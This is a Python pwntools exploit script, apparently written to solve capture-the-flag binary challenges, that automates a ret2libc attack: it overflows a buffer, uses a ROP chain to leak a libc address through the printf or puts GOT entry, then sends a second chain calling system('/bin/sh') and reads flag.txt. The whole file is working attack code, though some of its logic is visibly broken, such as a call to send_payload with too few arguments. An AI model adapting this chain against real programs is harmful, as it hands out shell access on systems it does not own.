from pwn import *
import padderia

context.log_level = 'error'
# Initialize cyclic_length and crash_pattern variables

def send_payload(binary, payload, chal_id):
    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443,ssl=True, sni=url)
    print(p.recvuntil(">>>"))
    p.interactive()
    p.sendline(payload)
    flag = re.findall(r'flag\{[^}]+\}', p.recvall(timeout=0.2).decode())
    if "flag" in flag:
        return flag
    else:
        print("Remote failed")

def exploit(binary):
    e = context.binary = ELF(binary)
    r = ROP(e)
    l = e.libc
    gs = '''
    continue
    '''

    p = process(binary)
    ret = p64(r.find_gadget(['ret'])[0])
    pop_rdi = p64(r.find_gadget(['pop rdi', 'ret'])[0])
    # Determine whether to target printf or puts
    if 'printf' in e.sym:
        puts_got = p64(e.got['printf'])
        puts_plt = p64(e.plt['printf'])
    elif 'puts' in e.sym:
        puts_got = p64(e.got['puts'])
        puts_plt = p64(e.plt['puts'])
    else:
        log.error("Neither printf nor puts found in GOT. Modify the script accordingly.")
        exit()

    # Generate cyclic pattern
    cyclic_length = padderia.find_pad(binary)

    if not cyclic_length:
        return "not found"

    cyclic_pattern = cyclic(cyclic_length)
    print(ret, u64((ret)))
    chain = cyclic_pattern
    chain += ret
    chain += pop_rdi
    chain += puts_got
    chain += puts_got
    #chain += p64(e.sym['printf'])
    chain += p64(e.sym['main'])
    print("about to get prompt")
    p.recvline()
    p.sendline(chain)


    leak = p.recvline()
    print("about to enter while")
    while b'\x7f' not in leak:
        print(leak)
        leak = p.recvline()
        print("stuck in while")
    puts_leak = u64(leak[0:6] + b'\x00\x00')
    if 'printf' in e.got:
        l.address = puts_leak - l.sym['printf']
        print("leak: 0x%x" %l.address)
    elif 'puts' in e.got:
        l.address = puts_leak - l.sym['puts']
    else:
        log.error("Neither printf nor puts found. Modify the script accordingly. second half of script")
        exit()

    bin_sh = p64(next(l.search(b'/bin/sh\0')))
    system = p64(l.sym['system'])
    print("going into 2nd chain")
    sleep(.25)
    # Try to exploit with the current offset
    chain = cyclic_pattern
    print(f"return gadget: {ret}")
    chain += ret
    chain += pop_rdi
    chain += bin_sh
    chain += system

    p.sendline(chain)
    sleep(0.2)
    try:
        p.sendline(b'cat flag.txt ; exit')
        return send_payload(binary, chain)
    except:
        print("no flag dummy")


    p.interactive()


if __name__ == "__main__":
    exploit(sys.argv[1])
